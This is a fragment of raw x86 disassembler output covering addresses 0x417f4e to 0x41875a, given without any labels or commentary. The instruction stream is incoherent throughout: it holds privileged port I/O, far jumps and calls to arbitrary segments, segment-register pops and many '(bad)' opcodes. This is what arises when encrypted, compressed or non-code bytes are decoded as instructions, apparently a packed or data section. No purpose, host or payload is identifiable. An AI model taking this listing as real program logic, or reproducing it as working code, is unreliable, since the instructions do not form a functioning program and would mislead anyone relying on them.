  417f4e:	xor    eax,0xbdf4f727
  417f53:	fs ret 0xb215
  417f57:	push   edi
  417f58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f59:	fnstcw WORD PTR [edi-0x4bf36718]
  417f5f:	ror    DWORD PTR [ebp+0x19],1
  417f62:	inc    ecx
  417f63:	jno    0x417fad
  417f65:	in     eax,0xf0
  417f67:	fstp   TBYTE PTR [esi]
  417f69:	push   ecx
  417f6a:	out    dx,al
  417f6b:	jmp    0x417f22
  417f6d:	out    dx,al
  417f6e:	xchg   ecx,eax
  417f6f:	call   0x54169159
  417f74:	and    DWORD PTR [ecx-0x264ef849],ecx
  417f7a:	adc    BYTE PTR [edi+eiz*2-0x5610d460],0xe4
  417f82:	or     esp,DWORD PTR [edi-0x6d]
  417f85:	pop    ss
  417f86:	pop    ds
  417f87:	or     ebp,DWORD PTR [ebp+0x29a526dc]
  417f8d:	and    eax,0x375a2f14
  417f92:	in     al,dx
  417f93:	sub    dl,BYTE PTR ds:0x35e61ed4
  417f99:	mov    dh,0x27
  417f9b:	or     eax,0x9333f91b
  417fa0:	jae    0x418007
  417fa2:	pop    edi
  417fa3:	xchg   ecx,eax
  417fa4:	es test eax,0xedf8c5b
  417faa:	sub    BYTE PTR [eax+0x44],dl
  417fad:	cdq    
  417fae:	test   eax,0xb8e917de
  417fb3:	aad    0x8e
  417fb5:	jns    0x418006
  417fb7:	dec    esp
  417fb8:	and    dl,dl
  417fba:	retf   
  417fbb:	gs dec edi
  417fbd:	push   eax
  417fbe:	or     ch,BYTE PTR [eax+0x6180781c]
  417fc4:	jmp    FWORD PTR [ecx-0x5d]
  417fc7:	sbb    eax,0x3043a075
  417fcc:	or     eax,0x1a0ae220
  417fd1:	dec    ebp
  417fd2:	sub    al,ch
  417fd4:	mov    ch,0x85
  417fd6:	leave  
  417fd7:	call   0x135c01d4
  417fdc:	out    0x2c,eax
  417fde:	jns    0x417fe8
  417fe0:	xor    eax,0xaff3c6d3
  417fe5:	fcom   DWORD PTR [ecx]
  417fe7:	push   ecx
  417fe8:	push   es
  417fe9:	pop    ebx
  417fea:	push   0x8995061
  417fef:	sar    DWORD PTR [ecx+0x28eb0d13],1
  417ff5:	fisubr WORD PTR [eax]
  417ff7:	aad    0x30
  417ff9:	pushf  
  417ffa:	lds    ebp,FWORD PTR ds:0x3e90f596
  418000:	mov    ch,0x2f
  418002:	(bad)
  418007:	add    edi,esi
  418009:	jns    0x418025
  41800b:	ins    DWORD PTR es:[edi],dx
  41800c:	fbld   TBYTE PTR [edx+0xd9de0a7]
  418012:	aam    0x28
  418014:	pop    edx
  418015:	cmp    BYTE PTR [edi],al
  418017:	repz cmc 
  418019:	sbb    esi,esp
  41801b:	jmp    0x635ffab1
  418020:	sub    edi,DWORD PTR [ecx]
  418022:	jmp    0x5f9d:0x5f08cc67
  418029:	mov    eax,0xc1479449
  41802e:	outs   dx,BYTE PTR ds:[esi]
  41802f:	push   eax
  418030:	(bad)  
  418031:	dec    ebx
  418032:	mov    eax,ds:0x7a979a1e
  418037:	outs   dx,DWORD PTR ds:[esi]
  418038:	mov    ds:0xad270d5c,al
  41803d:	sbb    eax,0x3d49f34e
  418042:	mov    al,ds:0x3f37656
  418047:	or     dh,dh
  418049:	fs xchg esi,eax
  41804b:	mov    ebx,0x5cbd13f1
  418050:	aas    
  418051:	mov    edx,esp
  418053:	cmp    al,0x38
  418055:	push   esi
  418056:	or     dh,BYTE PTR [ebx]
  418058:	sti    
  418059:	mov    ebx,0xd035f245
  41805e:	inc    ebp
  41805f:	in     al,dx
  418060:	imul   ecx,DWORD PTR [esi],0x34
  418063:	xlat   BYTE PTR ds:[ebx]
  418064:	and    DWORD PTR [ecx+0x55],ecx
  418067:	dec    esp
  418068:	arpl   dx,dx
  41806a:	scas   al,BYTE PTR es:[edi]
  41806b:	add    BYTE PTR [eax],dh
  41806d:	pushf  
  41806e:	sti    
  41806f:	push   edx
  418070:	inc    eax
  418071:	fld    DWORD PTR [ecx]
  418073:	cmc    
  418074:	xchg   esp,eax
  418075:	push   ebx
  418076:	(bad)  
  418078:	or     cl,BYTE PTR [edx]
  41807a:	mov    bl,0xe4
  41807c:	jg     0x418099
  41807e:	mov    ah,0x2a
  418080:	inc    ebp
  418081:	xlat   BYTE PTR ds:[ebx]
  418082:	inc    edi
  418083:	jmp    0x791a:0xadcd73dc
  41808a:	int3   
  41808b:	jle    0x418084
  41808d:	bound  ecx,QWORD PTR ds:0x7c16729f
  418093:	rcl    DWORD PTR [eax],cl
  418095:	je     0x4180dd
  418097:	data16 adc ah,BYTE PTR [edi+0x74f55ab4]
  41809e:	sub    eax,0xbb891cb3
  4180a3:	xchg   ebx,eax
  4180a4:	cmp    eax,0x26f07572
  4180a9:	or     al,0x13
  4180ab:	push   0x75
  4180ad:	xchg   ebx,eax
  4180ae:	and    esi,eax
  4180b0:	sub    edi,esp
  4180b2:	xor    eax,0xd60924ff
  4180b7:	jp     0x418051
  4180b9:	ins    DWORD PTR es:[edi],dx
  4180ba:	icebp  
  4180bb:	jl     0x418102
  4180bd:	push   ds
  4180be:	xor    BYTE PTR ds:0xcb324924,bh
  4180c4:	or     DWORD PTR [ebx+ecx*8-0xa],ebx
  4180c8:	pop    esi
  4180c9:	xor    ch,cl
  4180cb:	out    dx,eax
  4180cc:	lods   eax,DWORD PTR ds:[esi]
  4180cd:	add    al,0x44
  4180d0:	mov    al,0x2b
  4180d2:	fadd   DWORD PTR [esi+0x56]
  4180d5:	test   BYTE PTR [edi+0x71],bh
  4180d8:	add    DWORD PTR ds:0xcddd9540,ebp
  4180de:	fst    DWORD PTR [esp]
  4180e1:	dec    ebp
  4180e2:	sbb    ch,bl
  4180e4:	call   0xb39f:0x25709e20
  4180eb:	xor    al,0xbb
  4180ed:	and    eax,0x53654625
  4180f2:	or     dh,al
  4180f4:	out    dx,al
  4180f5:	imul   ebx,eax,0xffffff90
  4180f8:	and    eax,0x8076d8a9
  4180fd:	mov    dh,BYTE PTR [esi-0x68]
  418100:	pop    eax
  418101:	rcr    BYTE PTR [edx-0x18],0x65
  418105:	adc    al,0x2
  418107:	out    0x9b,al
  418109:	ror    DWORD PTR [edx+0x3ed92393],cl
  41810f:	ror    DWORD PTR [ebp-0x1d],cl
  418112:	and    DWORD PTR fs:[ebp-0x2ad1bc8d],ebp
  418119:	das    
  41811a:	mov    esp,0xce7933f2
  41811f:	lods   eax,DWORD PTR ds:[esi]
  418120:	and    DWORD PTR [ecx-0x1b],ecx
  418123:	and    al,0x1b
  418125:	and    al,0x1a
  418127:	in     eax,0x97
  418129:	lahf   
  41812a:	sahf   
  41812b:	rol    BYTE PTR [esi+esi*4-0x6d],0x13
  418130:	dec    esi
  418131:	test   eax,0x3effb309
  418136:	xor    al,0x5f
  418138:	ret    
  418139:	mov    bh,bh
  41813b:	jae    0x418102
  41813d:	hlt    
  41813e:	jmp    0x418131
  418140:	push   DWORD PTR [edi-0xf]
  418143:	cmp    eax,0x40e5a91d
  418148:	popf   
  418149:	jmp    0xe34ecb8
  41814e:	sub    al,0xac
  418150:	mov    cl,BYTE PTR [eax-0x134a51cd]
  418156:	stc    
  418157:	out    0x3f,al
  418159:	push   0xb
  41815b:	dec    ecx
  41815c:	and    BYTE PTR [ecx],bh
  41815e:	xchg   esi,eax
  41815f:	push   0xc704b214
  418164:	inc    ebp
  418165:	neg    DWORD PTR [eax]
  418167:	out    dx,eax
  418168:	leave  
  418169:	mov    ebx,0xa91ba1a8
  41816e:	(bad)  
  41816f:	loope  0x418153
  418171:	and    eax,0xa434d301
  418176:	jnp    0x418135
  418178:	mov    ecx,0x4b3f3a50
  41817d:	pop    edi
  41817e:	mov    edx,0xb6e6e1c0
  418183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418184:	sub    al,0x36
  418186:	fisttp QWORD PTR [esi+0x25]
  418189:	xchg   esi,eax
  41818a:	(bad)  
  41818b:	and    esp,edi
  41818d:	pop    ebx
  41818e:	and    al,0x51
  418191:	sbb    al,dh
  418193:	lock (bad) 
  418195:	hlt    
  418196:	jmp    0x418141
  418198:	jns    0x4181da
  41819a:	mov    eax,0xdaadc934
  41819f:	cmc    
  4181a0:	cmc    
  4181a1:	(bad)  
  4181a2:	push   esp
  4181a3:	jmp    0x9673d613
  4181a8:	push   esp
  4181a9:	jmp    0xba129677
  4181ae:	mov    ebx,0x4e795089
  4181b3:	in     eax,0x66
  4181b5:	push   eax
  4181b6:	jp     0x4181f6
  4181b8:	xlat   BYTE PTR ds:[ebx]
  4181b9:	cdq    
  4181ba:	xchg   ebx,eax
  4181bb:	mov    edi,0x93e28230
  4181c0:	jmp    0x4181ba
  4181c2:	mov    edi,0xd2c77c4
  4181c7:	retf   0x1b65
  4181ca:	ret    
  4181cb:	out    0x50,eax
  4181cd:	rol    DWORD PTR [edi-0x30],cl
  4181d0:	and    ecx,edi
  4181d2:	mov    esp,0xbc1ce51
  4181d7:	lock movs BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4181da:	sub    edi,esp
  4181dc:	les    ecx,FWORD PTR [ebx-0x47]
  4181df:	in     eax,0xd1
  4181e1:	or     al,0xe
  4181e3:	bound  ecx,QWORD PTR [esi]
  4181e5:	fstp   TBYTE PTR [esi+0x64409344]
  4181eb:	mov    DWORD PTR [ebp-0x6a],0x9efcf27c
  4181f2:	inc    esp
  4181f3:	push   ds
  4181f4:	xlat   BYTE PTR ds:[ebx]
  4181f5:	fldcw  WORD PTR [ecx-0x53e2a6f]
  4181fb:	mov    edi,0xef2d7185
  418200:	in     al,dx
  418201:	pushf  
  418202:	call   esp
  418204:	and    al,0xf9
  418206:	mov    dh,0x97
  418208:	inc    edi
  418209:	or     edi,DWORD PTR [edi+0x7bc9470e]
  41820f:	inc    edi
  418210:	in     al,0x55
  418212:	push   edi
  418213:	out    dx,eax
  418214:	sub    al,0xa7
  418216:	lods   eax,DWORD PTR ds:[esi]
  418217:	rdpmc  
  418219:	in     eax,0x52
  41821b:	scas   al,BYTE PTR es:[edi]
  41821c:	std    
  41821d:	sbb    al,0xb3
  41821f:	test   BYTE PTR [edi-0x2a],bl
  418222:	imul   edx,DWORD PTR [ebp+esi*4-0x24],0x20
  418227:	in     al,dx
  418228:	adc    BYTE PTR [ecx+0x192334f1],al
  41822e:	in     al,0x8d
  418230:	fld    QWORD PTR cs:[ebx+0x51]
  418234:	jns    0x41821e
  418236:	pop    edx
  418237:	dec    ebp
  418238:	gs int 0x76
  41823b:	out    0xc8,al
  41823d:	add    ch,BYTE PTR [edx-0x16c6e4bc]
  418243:	xor    bh,BYTE PTR [eax]
  418245:	enter  0xef5b,0x35
  418249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41824a:	sbb    edx,DWORD PTR [esi+0x11896d6c]
  418250:	and    ecx,0xc
  418253:	jae    0x418257
  418255:	imul   edx,edi,0x89a49c04
  41825b:	mov    ebp,0xa30c933b
  418260:	xlat   BYTE PTR ds:[ebx]
  418261:	loopne 0x41828b
  418263:	and    al,0x8
  418265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418266:	mov    ch,0x6
  418268:	out    0xa,al
  41826a:	jbe    0x418206
  41826c:	lea    esi,[ecx-0x7e]
  41826f:	or     ah,BYTE PTR [esp+eax*1]
  418272:	xchg   DWORD PTR [ecx+0x11],esi
  418275:	add    BYTE PTR [ebx-0x5f],bl
  418278:	gs push 0xffffffae
  41827b:	out    dx,al
  41827c:	mov    ebx,0x161f20ae
  418281:	dec    ecx
  418282:	mov    eax,ecx
  418284:	int3   
  418285:	add    ebp,ebx
  418287:	push   esp
  418288:	mov    ds:0xc5c80b9f,eax
  41828d:	shl    BYTE PTR [esi],1
  41828f:	iret   
  418290:	lods   al,BYTE PTR ds:[esi]
  418291:	push   ebp
  418292:	dec    ebx
  418293:	int    0xe8
  418295:	loop   0x41824d
  418297:	push   esp
  418298:	xchg   ebx,eax
  418299:	pop    edx
  41829a:	mov    al,0x0
  41829c:	test   DWORD PTR [edi-0x74],ecx
  41829f:	call   0x99d6ca53
  4182a4:	and    ebx,DWORD PTR [ecx]
  4182a6:	iret   
  4182a7:	out    0x14,al
  4182a9:	jno    0x418230
  4182ab:	pusha  
  4182ac:	cmp    bl,BYTE PTR [ebx+ecx*1-0x247cb96b]
  4182b3:	into   
  4182b4:	sub    al,0x2a
  4182b6:	inc    edi
  4182b7:	clc    
  4182b8:	jnp    0x418256
  4182ba:	jae    0x4182f4
  4182bc:	mov    bh,0xdf
  4182be:	push   esp
  4182bf:	pop    ecx
  4182c0:	mov    eax,0x9a839ba1
  4182c5:	sbb    al,BYTE PTR [ecx]
  4182c7:	cwde   
  4182c8:	pop    es
  4182c9:	sti    
  4182ca:	rol    BYTE PTR [ebx-0x4b3f036b],cl
  4182d0:	push   edi
  4182d1:	cmp    esi,DWORD PTR [esi-0x4704dfe2]
  4182d7:	mov    eax,0xf267fc05
  4182dc:	mov    ebp,DWORD PTR [edi-0x53]
  4182df:	jp     0x418302
  4182e1:	pop    ecx
  4182e2:	out    dx,al
  4182e3:	mov    ecx,0xcc97e262
  4182e8:	int3   
  4182e9:	call   0xaef3:0xf1cbd06b
  4182f0:	lods   eax,DWORD PTR ds:[esi]
  4182f1:	lahf   
  4182f2:	or     DWORD PTR [ebx+0x25],ebp
  4182f5:	sbb    ecx,ecx
  4182f7:	pop    ebx
  4182f8:	outs   dx,BYTE PTR ds:[esi]
  4182f9:	daa    
  4182fa:	es inc esi
  4182fc:	retf   0x4b9d
  4182ff:	and    al,0xdc
  418301:	xchg   dh,dh
  418303:	fisub  WORD PTR [edx]
  418305:	out    dx,eax
  418306:	enter  0x4da,0x4c
  41830a:	mov    cl,0xa4
  41830c:	dec    ebp
  41830d:	inc    eax
  41830e:	pop    ebp
  41830f:	rcl    BYTE PTR [ebp-0x1e],0x22
  418313:	hlt    
  418314:	sbb    bh,BYTE PTR [ebp+0xa13533d]
  41831a:	add    eax,DWORD PTR [eax+0x62]
  41831d:	pushf  
  41831e:	pop    ds
  41831f:	test   BYTE PTR [eax-0x6a27b27a],bh
  418325:	retf   
  418326:	aam    0xe8
  418328:	or     eax,0x491750bd
  41832d:	cmp    DWORD PTR [ebp+ebx*4-0x6b],esi
  418331:	(bad)  [ebp-0x680f82a5]
  418337:	repz push ss
  418339:	lods   eax,DWORD PTR ds:[esi]
  41833a:	dec    esp
  41833b:	adc    esp,edx
  41833d:	xchg   esi,eax
  41833e:	push   ss
  41833f:	push   edi
  418340:	jae    0x418346
  418342:	mov    ecx,0xf547984c
  418347:	lock mov al,ds:0xe914b6b9
  41834d:	lahf   
  41834e:	lds    eax,FWORD PTR [esi+0x75]
  418351:	int    0xb7
  418353:	out    0xcb,al
  418355:	sar    DWORD PTR [edi-0x2216e1f1],cl
  41835b:	in     eax,0xe6
  41835d:	sbb    DWORD PTR [edi+0x2cd5ced4],ebx
  418363:	jno    0x418331
  418365:	iret   
  418366:	mov    ebx,0x711628fc
  41836b:	in     al,0x5d
  41836d:	ja     0x418324
  41836f:	jg     0x418336
  418371:	xor    BYTE PTR [ebx-0x56],0x19
  418375:	sbb    esi,ebx
  418377:	mov    ebx,DWORD PTR [edi]
  418379:	pop    edi
  41837a:	adc    ch,ah
  41837c:	jb     0x41836c
  41837e:	retf   
  41837f:	xchg   edi,eax
  418380:	xchg   edi,eax
  418381:	into   
  418382:	xor    cl,al
  418384:	ins    DWORD PTR es:[edi],dx
  418385:	bound  esi,QWORD PTR [ebx]
  418387:	repnz and ecx,ecx
  41838a:	in     eax,dx
  41838b:	into   
  41838c:	cmp    BYTE PTR [esi],cl
  41838e:	call   DWORD PTR [ebp+0x1a2b9a16]
  418394:	in     eax,0xe9
  418396:	adc    eax,0xcb3dda75
  41839b:	cmc    
  41839c:	mov    DWORD PTR [ecx-0x16dfaad3],0xa56e111a
  4183a6:	fild   DWORD PTR [edx]
  4183a8:	adc    al,0x25
  4183aa:	fnstcw WORD PTR [eax+0x7f]
  4183ad:	add    al,0x7e
  4183af:	xor    bl,ch
  4183b1:	jb     0x418365
  4183b3:	inc    esp
  4183b4:	retf   
  4183b5:	jge    0x41839f
  4183b7:	fbld   TBYTE PTR ds:0xb5e73fce
  4183bd:	add    esi,DWORD PTR [ebp+eax*1+0x7f77eae7]
  4183c4:	dec    edx
  4183c5:	xor    eax,0xa484a821
  4183ca:	in     al,0x1a
  4183cc:	shl    BYTE PTR [ecx+0x3c7226eb],0x2f
  4183d3:	and    al,0xe5
  4183d5:	adc    al,0xae
  4183d7:	mov    esp,0x1873a84b
  4183dc:	or     DWORD PTR [edi+esi*2],0xffffffe2
  4183e0:	and    eax,0xf61144a6
  4183e5:	cwde   
  4183e6:	mov    ebx,0xe794df07
  4183eb:	xchg   edx,eax
  4183ec:	scas   eax,DWORD PTR es:[edi]
  4183ed:	dec    ecx
  4183ee:	mov    ebp,0xc97b53d0
  4183f3:	xor    al,0xe5
  4183f5:	das    
  4183f6:	xchg   ecx,eax
  4183f7:	cmp    eax,0x8abba128
  4183fc:	fidiv  DWORD PTR [edi+0x2c]
  4183ff:	push   ds
  418400:	stos   DWORD PTR es:[edi],eax
  418401:	mov    ds:0xf03cc9c7,al
  418406:	clc    
  418407:	add    al,0x50
  418409:	ror    DWORD PTR [eax+0x4f],0x2d
  41840d:	es cld 
  41840f:	repnz and eax,0x2fe84987
  418415:	fistp  QWORD PTR [eax]
  418417:	pop    edx
  418418:	sti    
  418419:	enter  0x18d5,0x75
  41841d:	cmp    DWORD PTR [eax-0x4b9c7cda],ebx
  418423:	add    al,0xf0
  418425:	test   al,0x2b
  418427:	idiv   DWORD PTR [ebx]
  418429:	jns    0x4183d3
  41842b:	mov    eax,0x6819fbcf
  418430:	popf   
  418431:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418432:	mov    edi,0x7a33fb24
  418437:	pushf  
  418438:	adc    eax,0x4aeb2480
  41843d:	cmp    bh,bl
  41843f:	inc    esi
  418440:	ror    BYTE PTR [edx+ebp*4],1
  418443:	sahf   
  418444:	inc    esi
  418445:	push   es
  418446:	fist   DWORD PTR [ebp-0xd7ae4db]
  41844c:	ss fwait
  41844e:	sub    ebx,DWORD PTR [ecx-0x38]
  418451:	pusha  
  418452:	shl    edi,1
  418454:	push   cs
  418455:	sbb    al,0x19
  418457:	(bad)  
  418458:	enter  0x2f42,0x85
  41845c:	sbb    DWORD PTR [ecx-0x65e4d5dd],ecx
  418462:	retf   
  418463:	sub    al,BYTE PTR [edi-0x36]
  418466:	cmp    ebx,ecx
  418468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418469:	adc    bh,BYTE PTR [edx-0x65]
  41846c:	pop    es
  41846d:	scas   al,BYTE PTR es:[edi]
  41846e:	mov    al,0xa4
  418470:	stos   DWORD PTR es:[edi],eax
  418471:	mov    esp,0xcc99e72
  418476:	jb     0x4184e0
  418478:	adc    DWORD PTR [edx-0x50e0f154],0x33
  41847f:	jb     0x4184da
  418481:	jge    0x4184d4
  418483:	or     esi,esi
  418485:	push   esi
  418486:	mov    esp,0x536e6534
  41848b:	outs   dx,BYTE PTR ds:[esi]
  41848c:	push   ebp
  41848d:	pmulhuw mm4,mm4
  418490:	dec    esp
  418491:	addr16 das 
  418493:	mov    ecx,0xb0c4291c
  418498:	jp     0x41846e
  41849a:	inc    esp
  41849b:	fldenv [eax]
  41849d:	or     eax,0xecaf8a3c
  4184a2:	xor    dl,BYTE PTR [ebx+0x56fca3c9]
  4184a8:	and    DWORD PTR [eax+0x3defcb7c],ebx
  4184ae:	push   esp
  4184af:	mov    eax,0xf7145a5b
  4184b4:	outs   dx,BYTE PTR ds:[esi]
  4184b5:	imul   esi,DWORD PTR [esi+0x1340c0f4],0x5b
  4184bc:	in     eax,0x74
  4184be:	je     0x4184b4
  4184c0:	aad    0xeb
  4184c2:	inc    esp
  4184c3:	pop    es
  4184c4:	and    cl,bl
  4184c6:	jo     0x4184fb
  4184c8:	push   ss
  4184c9:	dec    edi
  4184ca:	in     al,0x11
  4184cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184cd:	mov    ah,0xdb
  4184cf:	push   ecx
  4184d0:	ret    
  4184d1:	dec    edx
  4184d2:	inc    esi
  4184d3:	inc    edx
  4184d4:	out    dx,eax
  4184d5:	mov    eax,ds:0x89176802
  4184da:	mov    BYTE PTR [ecx-0x47360fc1],0x76
  4184e1:	pushf  
  4184e2:	mov    ebx,0x31f8a301
  4184e7:	fdiv   st(5),st
  4184e9:	test   eax,0x28abcb49
  4184ee:	lds    esp,FWORD PTR [edi+esi*8+0x27]
  4184f2:	mov    al,BYTE PTR [ebx-0x2944588f]
  4184f8:	or     eax,0x4e8a7adb
  4184fd:	shl    DWORD PTR [ecx-0x7430e55c],0xee
  418504:	push   eax
  418505:	dec    ecx
  418506:	cmp    ebx,DWORD PTR [ebx+edx*4+0x592b30a2]
  41850d:	pop    ecx
  41850e:	adc    ch,0x42
  418511:	jecxz  0x4184c5
  418513:	push   esp
  418514:	pop    ss
  418515:	clc    
  418516:	(bad)  
  418517:	sbb    al,0xc4
  418519:	stos   BYTE PTR es:[edi],al
  41851a:	sti    
  41851b:	nop
  41851c:	adc    al,0xb6
  41851e:	(bad)  
  41851f:	mov    ds:0x666ea06a,eax
  418524:	pop    ss
  418525:	jmp    0x196c695e
  41852a:	loope  0x4184c3
  41852c:	xlat   BYTE PTR ds:[ebx]
  41852d:	mov    ds:0x86995cdb,al
  418532:	int3   
  418533:	add    DWORD PTR [ebx-0x7],edi
  418536:	cmp    al,0xd
  418538:	es cwde 
  41853a:	cmp    al,0x9
  41853c:	ins    DWORD PTR es:[edi],dx
  41853d:	cdq    
  41853e:	cmc    
  41853f:	inc    edx
  418540:	add    ebx,esi
  418542:	and    edi,DWORD PTR [edx]
  418544:	adc    ebx,DWORD PTR [ebp-0x4af11105]
  41854a:	xor    ecx,DWORD PTR [ecx+edi*2]
  41854d:	xchg   ecx,eax
  41854e:	xor    bh,bl
  418550:	push   ecx
  418551:	sahf   
  418552:	mov    eax,0x6f57714
  418557:	scas   al,BYTE PTR es:[edi]
  418558:	add    eax,0x6df3238f
  41855d:	add    DWORD PTR [esi-0x79c6e2cb],eax
  418563:	addr16 clc 
  418565:	call   0xb48a1709
  41856a:	imul   esi,ebp,0x2b
  41856d:	mov    ah,0x35
  41856f:	arpl   WORD PTR ds:0x251ae2b9,dx
  418575:	mov    al,ds:0x2a43ce
  41857a:	ins    DWORD PTR es:[edi],dx
  41857b:	dec    ebp
  41857c:	push   ss
  41857d:	or     DWORD PTR [ecx],edx
  41857f:	pushf  
  418580:	push   edi
  418581:	sub    DWORD PTR [ecx+0x6d800e5d],ecx
  418587:	mov    dl,0xbd
  418589:	mov    eax,ds:0xd736f10b
  41858e:	xor    eax,0xc977ca66
  418593:	dec    edi
  418594:	and    eax,0xa08fe55
  418599:	push   0xffffff87
  41859b:	push   0xffffff89
  41859d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41859e:	inc    ebx
  41859f:	pop    esp
  4185a0:	retf   0x20f3
  4185a3:	pop    esi
  4185a4:	xchg   ebp,eax
  4185a5:	mov    edi,0xf893ea1d
  4185aa:	sub    eax,0x71e9243d
  4185af:	std    
  4185b0:	test   DWORD PTR [esi-0x1d],esi
  4185b3:	scas   eax,DWORD PTR es:[edi]
  4185b4:	push   ss
  4185b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185b6:	cmp    edi,DWORD PTR [eax]
  4185b8:	mov    bl,0x33
  4185ba:	outs   dx,BYTE PTR ds:[esi]
  4185bb:	pop    esp
  4185bc:	and    eax,0xa8f7f14c
  4185c1:	fucom  st(5)
  4185c3:	in     al,0x3f
  4185c5:	call   0xf53a:0xfcfd7eeb
  4185cc:	jmp    0xc30b:0x8391c04f
  4185d3:	hlt    
  4185d4:	sti    
  4185d5:	out    dx,eax
  4185d6:	and    eax,0xbb9941ca
  4185db:	ror    DWORD PTR [esi+0x1b1dc2c4],1
  4185e1:	imul   DWORD PTR [ecx-0x79]
  4185e4:	dec    edi
  4185e5:	mov    bh,BYTE PTR [ebx-0x2c1dadcc]
  4185eb:	sub    DWORD PTR [ebp+0x3d],edx
  4185ee:	jae    0x4185df
  4185f0:	xchg   dh,dh
  4185f2:	stos   DWORD PTR es:[edi],eax
  4185f3:	scas   eax,DWORD PTR es:[edi]
  4185f4:	sbb    eax,0xa4083959
  4185f9:	mov    eax,0x9e999b49
  4185fe:	sbb    ebx,DWORD PTR [edi-0xa]
  418601:	inc    ebx
  418602:	mov    al,0xc5
  418604:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418605:	hlt    
  418606:	les    ebx,FWORD PTR [eax-0x46]
  418609:	fs stos BYTE PTR es:[edi],al
  41860b:	aad    0xa0
  41860d:	push   ss
  41860e:	adc    al,0x76
  418610:	sbb    DWORD PTR [edx],ebp
  418612:	mov    al,ds:0xcd98c81b
  418617:	and    ch,BYTE PTR [ebx]
  418619:	mov    ds:0x34b6a47b,eax
  41861e:	xchg   edx,eax
  41861f:	push   esp
  418620:	sbb    al,0xc9
  418622:	ret    
  418623:	daa    
  418624:	push   cs
  418625:	out    0x87,al
  418627:	ds jge 0x418606
  41862a:	imul   ecx,DWORD PTR ds:0xbbc616f9,0xffffffe2
  418631:	sti    
  418632:	fiadd  DWORD PTR [edi]
  418634:	repz hlt 
  418636:	sub    esp,ebp
  418638:	inc    ebp
  418639:	mov    esi,0xdc66ee15
  41863e:	or     al,0xd1
  418640:	in     al,0x2c
  418642:	inc    esi
  418643:	jne    0x418635
  418645:	imul   edx,DWORD PTR [ecx-0x4dde9db7],0xffffffa4
  41864c:	call   0x4494:0xc57d0ba5
  418653:	fimul  WORD PTR [eax]
  418655:	lods   al,BYTE PTR ds:[esi]
  418656:	out    0x4,eax
  418658:	cwde   
  418659:	shl    DWORD PTR [esp+edx*1+0x476ea22d],0x65
  418661:	into   
  418662:	hlt    
  418663:	out    dx,eax
  418664:	das    
  418665:	jae    0x4186c8
  418667:	(bad)  
  418668:	xor    bh,cl
  41866a:	sbb    ebp,eax
  41866c:	mov    ebp,0x1b1950bf
  418671:	sub    BYTE PTR [ebp-0x65],0x46
  418675:	imul   ebp,eax,0x81a39e57
  41867b:	dec    ebp
  41867c:	xor    eax,0x39aa370e
  418681:	ins    DWORD PTR es:[edi],dx
  418682:	mov    ebp,0xfa5b3af4
  418687:	and    eax,0xf2e9aa05
  41868c:	cmp    al,0x4c
  41868e:	xchg   BYTE PTR [edi],al
  418690:	pop    ss
  418691:	cmp    DWORD PTR [eax+0x4e],edi
  418694:	mov    dh,0x11
  418696:	test   BYTE PTR [edx],al
  418698:	je     0x41863d
  41869a:	stos   DWORD PTR es:[edi],eax
  41869b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41869c:	push   cs
  41869d:	aam    0x67
  41869f:	sub    esi,0xffffffe8
  4186a2:	pop    ebp
  4186a3:	add    BYTE PTR [ebp-0x41db4609],ch
  4186a9:	out    0xf4,al
  4186ab:	nop
  4186ac:	aad    0x95
  4186ae:	mov    ecx,0x6c5c7de6
  4186b3:	ss pop ss
  4186b5:	stc    
  4186b6:	or     BYTE PTR [edi+ecx*8+0x26],dh
  4186ba:	jae    0x41865b
  4186bc:	add    DWORD PTR [esi+0x2d48042c],eax
  4186c2:	xchg   edx,eax
  4186c3:	mov    ecx,0x3cb9c760
  4186c8:	and    BYTE PTR [ecx-0x53],ch
  4186cb:	fs inc eax
  4186cd:	add    esp,eax
  4186cf:	sub    dh,BYTE PTR [eax]
  4186d1:	pop    ds
  4186d2:	xor    ch,bl
  4186d4:	adc    al,0x6b
  4186d6:	pop    eax
  4186d7:	sbb    DWORD PTR [edi-0x2eb30465],0xffffff81
  4186de:	fimul  WORD PTR [ebp+0x18]
  4186e1:	or     DWORD PTR [edx+0x12b7e431],ebx
  4186e7:	popf   
  4186e8:	fisttp WORD PTR [esp+ebx*2]
  4186eb:	imul   ebx,eax,0x18
  4186ee:	mov    ah,0x6d
  4186f0:	(bad)  
  4186f1:	out    dx,eax
  4186f2:	and    eax,0x719a0eec
  4186f7:	cmp    DWORD PTR [ebp+eiz*4+0x34389703],ebx
  4186fe:	sahf   
  4186ff:	mov    dh,0x65
  418701:	addr16 clc 
  418703:	repnz in al,dx
  418705:	sub    DWORD PTR [ebp+0x71],ebx
  418708:	inc    ecx
  418709:	dec    edx
  41870a:	pcmpeqd mm6,QWORD PTR [eax]
  41870d:	or     DWORD PTR [edi+edi*1-0x32],edx
  418711:	mov    ds:0xb7955e54,al
  418716:	sti    
  418717:	nop
  418718:	inc    eax
  418719:	xchg   ecx,eax
  41871a:	iret   
  41871b:	jbe    0x4186e4
  41871d:	pop    edx
  41871e:	mov    ch,BYTE PTR [edi]
  418720:	jo     0x418712
  418722:	or     BYTE PTR [esi+0x76],bl
  418725:	or     edi,ebp
  418727:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418728:	mov    ecx,0x560592e6
  41872d:	sbb    bl,0xe2
  418730:	push   esp
  418731:	sti    
  418732:	xor    edx,DWORD PTR [edi+0x9]
  418735:	call   0x9041:0xa6967fb5
  41873c:	ror    ebp,0xe4
  41873f:	jno    0x418776
  418741:	dec    ecx
  418742:	mov    ch,0xec
  418744:	enter  0xee3f,0xaf
  418748:	out    dx,al
  418749:	fcomp  QWORD PTR [edi]
  41874b:	push   0xb4eac925
  418750:	dec    esp
  418751:	das    
  418752:	popa   
  418753:	push   edx
  418754:	add    BYTE PTR [edx+0x7f5e4c4b],ah
  41875a:	cmp    BYTE PTR [ebx-0x58],ah
